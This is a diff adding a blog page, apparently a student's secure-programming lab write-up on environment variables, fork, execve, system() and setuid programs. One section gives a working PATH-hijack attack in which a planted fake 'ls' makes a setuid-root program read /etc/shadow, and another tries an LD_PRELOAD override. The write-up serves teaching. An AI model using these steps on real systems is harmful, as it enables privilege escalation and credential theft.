@@ -1,0 +1,655 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>secure programming homework 3 &#183; mahmood</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css><link rel=stylesheet href=/org.css><script src=/org.js></script>
+<link rel=icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/%20images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/%20images/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/%20images/apple-touch-icon.png><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css><link href rel=alternate type=application/rss+xml title=mahmood><script src=/js/darkmode.js></script></head><body><nav class=nav><div class=nav-container><a href=/><span class=nav-title>mahmood</span></a><ul><li><a href=/><span>home</span></a></li><li><a href=/blog><span>blog</span></a></li><li><a href=/index/><span>index</span></a></li><li><a href=/about><span>about</span></a></li></ul></div></nav><div id=darkModeToggle onclick=toggleDarkMode()>&#9680;</div><main><aside class=toc><script src=/js/toc.js></script><div id=tocContainer><div id=tocTitle>&#9776;</div><div id=tocCollapsible></div></div></aside><div class=post><div class=post-info><time datetime="2023-08-22 22:38:13 +0000 UTC">August 22, 2023</time></div><h1 class=post-title>secure programming homework 3</h1><div class=post-desc></div><div class=post-line></div><h1 id=first-question-on-env-vars>first question on env vars</h1><p>step 1, examining the env of the parent process</p><pre class="c highlight" data-org-language=C data-exports=both data-tangle='(format "%s/parent_args.c" (org-attach-dir))' data-results=verbatim><code>#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+extern char **environ;
+
+void printenv() {
+  int i = 0;
+  while (environ[i] != NULL) {
+    printf(&quot;%s\n&quot;, environ[i]);
+    i++;
+  }
+}
+
+int main() {
+  pid_t child_pid;
+  switch (child_pid = fork()) {
+  case 0: // child process
+    /* printenv(); */
+    exit(0);
+  default: // parent process
+    printenv();
+    exit(0);
+  }
+}
+</code></pre><pre class="example highlight"><code>PWD=/home/mahmooz/brain/notes
+DISPLAY=:0
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+_=/tmp/babel-4G1N4I/C-bin-AKOZ9r
+OLDPWD=/home/mahmooz/brain/notes
+QT_SCALE_FACTOR=2
+MAIL=/var/spool/mail/mahmooz
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+BROWSER=firefox
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+XDG_RUNTIME_DIR=/run/user/1000
+XDG_SESSION_ID=1
+XDG_VTNR=1
+LESS_TERMCAP_us=[1;4;31m
+LESS_TERMCAP_ue=[0m
+SHLVL=2
+USER=mahmooz
+LESS_TERMCAP_md=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_mb=[1;32m
+TERM=dumb
+XDG_SESSION_CLASS=user
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+KEYTIMEOUT=1
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+_JAVA_AWT_WM_NONREPARENTING=1.
+LANG=en_US.UTF-8
+HOME=/home/mahmooz
+MOTD_SHOWN=pam
+WINDOWPATH=1
+TERMINAL=st
+XAUTHORITY=/home/mahmooz/.Xauthority
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+SYSTEMD_EXEC_PID=619
+XDG_SESSION_TYPE=tty
+LOGNAME=mahmooz
+XDG_SEAT=seat0
+EDITOR=nvim
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+LESS_TERMCAP_so=[01;33m
+LESS_TERMCAP_se=[0m
+SHELL=/bin/zsh
+</code></pre><p>step 2, examining the env of a child process:</p><pre class="c highlight" data-org-language=C data-exports=both data-tangle='(format "%s/child_args.c" (org-attach-dir))' data-results=verbatim><code>#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+extern char **environ;
+
+void printenv() {
+  int i = 0;
+  while (environ[i] != NULL) {
+    printf(&quot;%s\n&quot;, environ[i]);
+    i++;
+  }
+}
+
+int main() {
+  pid_t child_pid;
+  switch (child_pid = fork()) {
+  case 0: // child process
+    printenv();
+    exit(0);
+  default: // parent process
+    /* printenv(); */
+    exit(0);
+  }
+}
+</code></pre><pre class="example highlight"><code>PWD=/home/mahmooz/brain/notes
+DISPLAY=:0
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+_=/tmp/babel-4G1N4I/C-bin-OnOtO9
+OLDPWD=/home/mahmooz/brain/notes
+QT_SCALE_FACTOR=2
+MAIL=/var/spool/mail/mahmooz
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+BROWSER=firefox
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+XDG_RUNTIME_DIR=/run/user/1000
+XDG_SESSION_ID=1
+XDG_VTNR=1
+LESS_TERMCAP_us=[1;4;31m
+LESS_TERMCAP_ue=[0m
+SHLVL=2
+USER=mahmooz
+LESS_TERMCAP_md=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_mb=[1;32m
+TERM=dumb
+XDG_SESSION_CLASS=user
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+KEYTIMEOUT=1
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+_JAVA_AWT_WM_NONREPARENTING=1.
+LANG=en_US.UTF-8
+HOME=/home/mahmooz
+MOTD_SHOWN=pam
+WINDOWPATH=1
+TERMINAL=st
+XAUTHORITY=/home/mahmooz/.Xauthority
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+SYSTEMD_EXEC_PID=619
+XDG_SESSION_TYPE=tty
+LOGNAME=mahmooz
+XDG_SEAT=seat0
+EDITOR=nvim
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+LESS_TERMCAP_so=[01;33m
+LESS_TERMCAP_se=[0m
+SHELL=/bin/zsh
+</code></pre><p>they both have the same environment variables, so a child process does indeed inherit its parents environment
+generating the files for diffing:</p><pre class="bash highlight" dir=(org-attach-dir) data-results=silent><code>gcc -o a.out child_args.c
+./a.out &gt; output1
+gcc -o a.out parent_args.c
+./a.out &gt; output2
+</code></pre><p>now we can <code>diff</code> them:</p><pre class="bash highlight" dir=(org-attach-dir) data-exports=both><code>diff output1 output2
+echo diff exit value: $?
+</code></pre><pre class="example highlight"><code>diff exit value: 0
+</code></pre><p>diff exits with value 0 and in <code>man diff</code> i found:</p><pre class="example highlight"><code>Exit status is 0 if inputs are the same, 1 if different, 2 if trouble.
+</code></pre><p>so indeed both programs have the same output which means a child process that is created with <code>fork()</code> does inherit its parent's environment variables</p><h1 id=execve-and-env-vars>execve and env vars</h1><pre class="c highlight" data-org-language=C><code>#include &lt;unistd.h&gt;
+
+extern char **environ;
+
+int main() {
+  char *argv[2];
+  argv[0] = &quot;/usr/bin/env&quot;;
+  argv[1] = NULL;
+  execve(&quot;/usr/bin/env&quot;, argv, NULL);
+  return 0;
+}
+</code></pre><p>the program outputs nothing, which means it has no environment variables, which means processes created by <code>execve</code> dont inherit the parent's env vars.</p><pre class="c highlight" data-org-language=C data-results=output data-exports=both><code>#include &lt;unistd.h&gt;
+
+extern char **environ;
+
+int main() {
+  char *argv[2];
+  argv[0] = &quot;/usr/bin/env&quot;;
+  argv[1] = NULL;
+  execve(&quot;/usr/bin/env&quot;, argv, environ);
+  return 0;
+}
+</code></pre><pre class="example highlight"><code>PWD=/home/mahmooz/brain/notes
+DISPLAY=:0
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+_=/tmp/babel-4G1N4I/C-bin-OYe9QC
+OLDPWD=/home/mahmooz/brain/notes
+QT_SCALE_FACTOR=2
+MAIL=/var/spool/mail/mahmooz
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+BROWSER=firefox
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+XDG_RUNTIME_DIR=/run/user/1000
+XDG_SESSION_ID=1
+XDG_VTNR=1
+LESS_TERMCAP_us=[1;4;31m
+LESS_TERMCAP_ue=[0m
+SHLVL=2
+USER=mahmooz
+LESS_TERMCAP_md=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_mb=[1;32m
+TERM=dumb
+XDG_SESSION_CLASS=user
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+KEYTIMEOUT=1
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+_JAVA_AWT_WM_NONREPARENTING=1.
+LANG=en_US.UTF-8
+HOME=/home/mahmooz
+MOTD_SHOWN=pam
+WINDOWPATH=1
+TERMINAL=st
+XAUTHORITY=/home/mahmooz/.Xauthority
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+SYSTEMD_EXEC_PID=619
+XDG_SESSION_TYPE=tty
+LOGNAME=mahmooz
+XDG_SEAT=seat0
+EDITOR=nvim
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+LESS_TERMCAP_so=[01;33m
+LESS_TERMCAP_se=[0m
+SHELL=/bin/zsh
+</code></pre><p>we got a bunch of environment variables printed out, so it seems the third argument to <code>execve</code> specifies the list of environment variables for the new process</p><h1 id=system-function-and-env-vars><code>system</code> function and env vars</h1><p>checking whether <code>system</code> passes env vars:</p><pre class="c highlight" data-org-language=C data-results=output data-exports=both><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+  system(&quot;/usr/bin/env&quot;);
+  return 0;
+}
+</code></pre><pre class="example highlight"><code>SHELL=/bin/zsh
+LESS_TERMCAP_se=[0m
+LESS_TERMCAP_so=[01;33m
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+EDITOR=nvim
+XDG_SEAT=seat0
+PWD=/home/mahmooz/brain/notes
+LOGNAME=mahmooz
+XDG_SESSION_TYPE=tty
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+SYSTEMD_EXEC_PID=619
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+_=/usr/bin/env
+XAUTHORITY=/home/mahmooz/.Xauthority
+TERMINAL=st
+WINDOWPATH=1
+MOTD_SHOWN=pam
+HOME=/home/mahmooz
+LANG=en_US.UTF-8
+_JAVA_AWT_WM_NONREPARENTING=1.
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+KEYTIMEOUT=1
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+XDG_SESSION_CLASS=user
+TERM=dumb
+LESS_TERMCAP_mb=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_md=[1;32m
+USER=mahmooz
+DISPLAY=:0
+SHLVL=2
+LESS_TERMCAP_ue=[0m
+LESS_TERMCAP_us=[1;4;31m
+XDG_VTNR=1
+XDG_SESSION_ID=1
+XDG_RUNTIME_DIR=/run/user/1000
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+BROWSER=firefox
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+MAIL=/var/spool/mail/mahmooz
+QT_SCALE_FACTOR=2
+OLDPWD=/home/mahmooz/brain/notes
+</code></pre><p>indeed, we get the full list of env vars</p><h1 id=env-vars-and-setuid>env vars and setuid</h1><p>this program simply prints its env vars:</p><pre class="c highlight" data-org-language=C data-tangle='(format "%s/setuid_first.c" (org-attach-dir))' data-results=output data-exports=both><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+extern char **environ;
+
+int main() {
+  int i = 0;
+  while (environ[i] != NULL) {
+    printf(&quot;%s\n&quot;, environ[i]);
+    i++;
+  }
+}
+</code></pre><pre class="example highlight"><code>PWD=/home/mahmooz/brain/notes
+DISPLAY=:0
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+_=/tmp/babel-4G1N4I/C-bin-MCKuwX
+OLDPWD=/home/mahmooz/brain/notes
+QT_SCALE_FACTOR=2
+MAIL=/var/spool/mail/mahmooz
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+BROWSER=firefox
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+XDG_RUNTIME_DIR=/run/user/1000
+XDG_SESSION_ID=1
+XDG_VTNR=1
+LESS_TERMCAP_us=[1;4;31m
+LESS_TERMCAP_ue=[0m
+SHLVL=2
+USER=mahmooz
+LESS_TERMCAP_md=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_mb=[1;32m
+TERM=dumb
+XDG_SESSION_CLASS=user
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+KEYTIMEOUT=1
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+_JAVA_AWT_WM_NONREPARENTING=1.
+LANG=en_US.UTF-8
+HOME=/home/mahmooz
+MOTD_SHOWN=pam
+WINDOWPATH=1
+TERMINAL=st
+XAUTHORITY=/home/mahmooz/.Xauthority
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+SYSTEMD_EXEC_PID=619
+XDG_SESSION_TYPE=tty
+LOGNAME=mahmooz
+XDG_SEAT=seat0
+EDITOR=nvim
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+LESS_TERMCAP_so=[01;33m
+LESS_TERMCAP_se=[0m
+SHELL=/bin/zsh
+</code></pre><p>we change it to a <a href=20230808220944-setuid.html>setuid</a> program whose owner is root:</p><pre class="bash highlight" dir=(org-attach-dir) data-results=silent><code>gcc setuid_first.c
+sudo chown root:root a.out
+sudo chmod u+s a.out
+</code></pre><p>checking whether env vars are passed to setuid programs:</p><pre class="bash highlight" dir=(org-attach-dir) data-exports=both data-results=verbatim><code>export PATH LD_LIBRARY_PATH ANY_NAME
+./a.out
+</code></pre><pre class="example highlight"><code>SHELL=/bin/zsh
+LESS_TERMCAP_se=[0m
+LESS_TERMCAP_so=[01;33m
+CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+PYTHON_HISTORY_FILE=/home/mahmooz/.python_history
+EDITOR=nvim
+XDG_SEAT=seat0
+PWD=/home/mahmooz/brain/notes/data/b9/e6307b-3cb2-471c-8b21-dda7af29fd8e
+LOGNAME=mahmooz
+XDG_SESSION_TYPE=tty
+TEXINPUTS=.:/home/mahmooz/.emacs.d/elpa/auctex-13.2.1/latex:
+SYSTEMD_EXEC_PID=619
+GUILE_LOAD_PATH=/home/mahmooz/workspace/guix/
+XAUTHORITY=/home/mahmooz/.Xauthority
+TERMINAL=st
+WINDOWPATH=1
+MOTD_SHOWN=pam
+HOME=/home/mahmooz
+LANG=en_US.UTF-8
+_JAVA_AWT_WM_NONREPARENTING=1.
+PYTHONSTARTUP=/home/mahmooz/.pythonrc
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure
+KEYTIMEOUT=1
+INVOCATION_ID=90f4a5a5c6484eebae772e84fd648947
+XDG_SESSION_CLASS=user
+TERM=dumb
+LESS_TERMCAP_mb=[1;32m
+LESS_TERMCAP_me=[0m
+LESS_TERMCAP_md=[1;32m
+USER=mahmooz
+DISPLAY=:0
+LESS_TERMCAP_ue=[0m
+SHLVL=3
+LESS_TERMCAP_us=[1;4;31m
+XDG_VTNR=1
+XDG_SESSION_ID=1
+XDG_RUNTIME_DIR=/run/user/1000
+DEBUGINFOD_URLS=https://debuginfod.archlinux.org 
+BROWSER=firefox
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+MAIL=/var/spool/mail/mahmooz
+QT_SCALE_FACTOR=2
+OLDPWD=/home/mahmooz
+_=./a.out
+</code></pre><p>neither LD<sub>LIBRARYPATH</sub> nor ANY<sub>NAME</sub> were inherited, so it seems not all variables get inherited?</p><h1 id=path-and-setuid>path and setuid</h1><pre class="c highlight" data-org-language=C dir=(org-attach-dir) data-tangle='(format "%s/ls.c" (org-attach-dir))' data-eval=no><code>#include &lt;stdlib.h&gt;
+
+int main() {
+  system(&quot;ls&quot;);
+  return 0;
+}
+</code></pre><p>turning it into a setuid program and manipulating it to use a modified, malicious version of <code>ls</code>:</p><pre class="bash highlight" dir=(org-attach-dir) data-exports=both><code># temporarily change /bin/sh to /bin/zsh for the exploit to work
+sudo ln -sf /bin/zsh /bin/sh
+
+# compile the program
+gcc ls.c
+
+# turn on the setuid bit
+sudo chown root:root a.out
+sudo chmod u+s a.out
+
+# create our own executable ls
+[ ! -d /tmp/mybin ] &amp;&amp; mkdir /tmp/mybin/
+echo -e &quot;#!/usr/bin/zsh\ntail -1 /etc/shadow&quot; &gt; /tmp/mybin/ls
+chmod +x /tmp/mybin/ls
+
+# execute the program with a modified PATH
+export PATH=&quot;/tmp/mybin/:$PATH&quot; # /tmp/mybin should precede /bin
+./a.out
+
+# restore dash cuz i dont want my script to be slow
+sudo ln -sf /bin/dash /bin/sh
+</code></pre><pre class="example highlight"><code>mahmooz2:!:19587:0:99999:7:::
+</code></pre><p>the exploit worked indeed, this means that the child process does inherit the <code>$PATH</code> environment variable
+from the manual of <code>system</code>:</p><pre class="example highlight"><code>set-group-ID program, or a program with capabilities) because
+strange values for some environment variables might be used to
+subvert system integrity.  For example, PATH could be manipulated
+so that an arbitrary program is executed with privilege.  Use the
+exec(3) family of functions instead, but not execlp(3) or
+execvp(3) (which also use the PATH environment variable to search
+for an executable).
+
+system() will not, in fact, work properly from programs with set-
+user-ID or set-group-ID privileges on systems on which /bin/sh is
+bash version 2: as a security measure, bash 2 drops privileges on
+startup.  (Debian uses a different shell, dash(1), which does not
+do this when invoked as sh.)
+</code></pre><h1 id=ld_preload-and-setuid-programs><code>ld_preload</code> and setuid programs</h1><pre class="c highlight" data-org-language=C data-tangle='(format "%s/mylib.c" (org-attach-dir))' data-eval=no><code>#include &lt;stdio.h&gt;
+
+unsigned int sleep(unsigned int s) {
+  /* if this is invoked by a privileged program,
+     you can do damages here! */
+  printf(&quot;i am not sleeping!\n&quot;);
+}
+</code></pre><p>to compile it we use:</p><pre class="bash highlight" dir=(org-attach-dir) data-results=silent><code>gcc -fPIC -g -c mylib.c
+gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
+</code></pre><p>defining <code>LD_PRELOAD</code>:</p><pre class="bash highlight" data-eval=no><code>export LD_PRELOAD=./libmylib.so.1.0.1
+</code></pre><p>consdering another program, <code>myprog.c</code>:</p><pre class="c highlight" data-org-language=C data-tangle='(format "%s/myprog.c" (org-attach-dir))' data-eval=no><code>#include &lt;unistd.h&gt;
+
+int main() {
+  sleep(1);
+  return 0;
+}
+</code></pre><p>running <code>myprog</code> as a normal program from a non-privileged user:</p><pre class="bash highlight" dir=(org-attach-dir) data-results=silent><code>[ -f myprog ] &amp;&amp; sudo rm -f myprog # cleanup
+gcc -fPIC -g -c mylib.c
+gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
+export LD_PRELOAD=$PWD/libmylib.so.1.0.1
+gcc -o myprog myprog.c
+./myprog
+</code></pre><p><code>myprog</code> slept for 1 second and didnt output anything to stdout, which is NOT the expected behavior
+i couldnt find it why it wasnt working, the program kept running the sleep function from <code>unistd.h</code> and not the one in <code>mylib.c</code>, i just gave up eventually, but for reference here's the output of <code>strace ./myprog</code>:</p><pre class="c highlight" data-org-language=C data-eval=no><code>execve(&quot;./myprog&quot;, [&quot;./myprog&quot;], 0x7ffdc624f7c0 /* 47 vars */) = 0
+brk(NULL)                               = 0x56169eeb8000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd99cb64b0) = -1 EINVAL (Invalid argument)
+openat(AT_FDCWD, &quot;/home/mahmooz/brain/notes/data/b9/e6307b-3cb2-471c-8b21-dda7af29fd8e/libmylib.so.1.0.1&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\0\0\0\0\0\0\0&quot;..., 832) = 832
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=21448, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f22b4524000
+mmap(NULL, 16408, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f22b451f000
+mmap(0x7f22b4520000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1000) = 0x7f22b4520000
+mmap(0x7f22b4521000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f22b4521000
+mmap(0x7f22b4522000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f22b4522000
+close(3)                                = 0
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0644, st_size=114739, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 114739, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f22b4502000
+close(3)                                = 0
+openat(AT_FDCWD, &quot;/usr/lib/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\220~\2\0\0\0\0\0&quot;..., 832) = 832
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+newfstatat(3, &quot;&quot;, {st_mode=S_IFREG|0755, st_size=2366592, ...}, AT_EMPTY_PATH) = 0
+pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784
+mmap(NULL, 2411920, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f22b4200000
+mmap(0x7f22b4226000, 1437696, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f22b4226000
+mmap(0x7f22b4385000, 348160, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x185000) = 0x7f22b4385000
+mmap(0x7f22b43da000, 417792, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d9000) = 0x7f22b43da000
+mmap(0x7f22b4440000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f22b4440000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f22b44ff000
+arch_prctl(ARCH_SET_FS, 0x7f22b44ff740) = 0
+set_tid_address(0x7f22b44ffa10)         = 1580754
+set_robust_list(0x7f22b44ffa20, 24)     = 0
+rseq(0x7f22b4500060, 0x20, 0, 0x53053053) = 0
+mprotect(0x7f22b43da000, 409600, PROT_READ) = 0
+mprotect(0x7f22b4522000, 4096, PROT_READ) = 0
+mprotect(0x56169d7c0000, 4096, PROT_READ) = 0
+mprotect(0x7f22b4557000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=9788*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x7f22b4502000, 114739)          = 0
+clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, 0x7ffd99cb64b0) = 0
+exit_group(0)                           = ?
++++ exited with 0 +++
+[ Babel evaluation exited with code 0 ]
+</code></pre><p>and this is the output of <code>objdump -t ./myprog</code>:</p><pre class="example highlight"><code>e6307b-3cb2-471c-8b21-dda7af29fd8e λ objdump -t ./myprog
+
+./myprog:     file format elf64-x86-64
+
+SYMBOL TABLE:
+0000000000000000 l    df *ABS*    0000000000000000              myprog.c
+0000000000000000 l    df *ABS*    0000000000000000              
+0000000000003de0 l     O .dynamic 0000000000000000              _DYNAMIC
+0000000000002004 l       .eh_frame_hdr    0000000000000000              __GNU_EH_FRAME_HDR
+0000000000003fe8 l     O .got.plt 0000000000000000              _GLOBAL_OFFSET_TABLE_
+0000000000000000       F *UND*    0000000000000000              __libc_start_main@GLIBC_2.34
+0000000000000000  w      *UND*    0000000000000000              _ITM_deregisterTMCloneTable
+0000000000004008  w      .data    0000000000000000              data_start
+0000000000004018 g       .data    0000000000000000              _edata
+0000000000001150 g     F .fini    0000000000000000              .hidden _fini
+0000000000004008 g       .data    0000000000000000              __data_start
+0000000000000000  w      *UND*    0000000000000000              __gmon_start__
+0000000000004010 g     O .data    0000000000000000              .hidden __dso_handle
+0000000000002000 g     O .rodata  0000000000000004              _IO_stdin_used
+0000000000004020 g       .bss 0000000000000000              _end
+0000000000001040 g     F .text    0000000000000026              _start
+0000000000004018 g       .bss 0000000000000000              __bss_start
+0000000000001139 g     F .text    0000000000000015              main
+0000000000004018 g     O .data    0000000000000000              .hidden __TMC_END__
+0000000000000000  w      *UND*    0000000000000000              _ITM_registerTMCloneTable
+0000000000000000       F *UND*    0000000000000000              sleep@GLIBC_2.2.5
+0000000000000000  w    F *UND*    0000000000000000              __cxa_finalize@GLIBC_2.2.5
+0000000000001000 g     F .init    0000000000000000              .hidden _init
+</code></pre><p>next step, running it as a setuid program and executing it from a non-privileged user:</p><pre class="bash highlight" dir=(org-attach-dir) data-results=silent><code>[ -f myprog ] &amp;&amp; sudo rm -f myprog # cleanup
+export LD_PRELOAD=./libmylib.so.1.0.1
+gcc -o myprog myprog.c
+sudo chown root:root myprog
+sudo chmod u+s myprog
+./myprog
+</code></pre><p>it ran successfully, sleeping for 1 second
+running it as a setuid program and exporting ld<sub>preload</sub> from root, had to do it in an external terminal (couldnt do it in my <code>org-mode</code> document with <code>org-babel</code>),</p><pre class="bash highlight" data-eval=no><code>[ -f myprog ] &amp;&amp; sudo rm -f myprog # cleanup
+gcc -o myprog myprog.c
+sudo chown root:root myprog
+sudo chmod u+s myprog
+
+# here switch to root using su so the following commands will be executed as root
+
+export LD_PRELOAD=./libmylib.so.1.0.1
+./myprog
+</code></pre><p>it ran successfully, sleeping for 1 second
+setting it as a setuid program that is owned by another user called <code>mahmooz2</code> and executing it from that account:</p><pre class="bash highlight" data-eval=no><code>[ -f myprog ] &amp;&amp; sudo rm -f myprog # cleanup
+gcc -o myprog myprog.c
+sudo chown mahmooz2 myprog
+sudo chmod u+s myprog
+
+# here switch to mahmooz2 using sudo su mahmooz2 so the following commands will be executed as mahmooz2
+
+export LD_PRELOAD=./libmylib.so.1.0.1
+./myprog
+</code></pre><p>again, it executed successfully, sleeping for 1 second
+i probably did something wrong because in all cases i got the same behavior, lol.</p><h1 id=executing-external-programs-with-system-and-execve>executing external programs with system and execve</h1><p>the following program, when ran as a setuid program, allows a user to view any file in the system even if they dont own it. on the other side, this program doesnt allow the writing of a file by someone who doesnt own it</p><pre class="c highlight" data-org-language=C data-tangle='(format "%s/myexec.c" (org-attach-dir))' data-eval=no><code>#include &lt;unistd.h&gt;
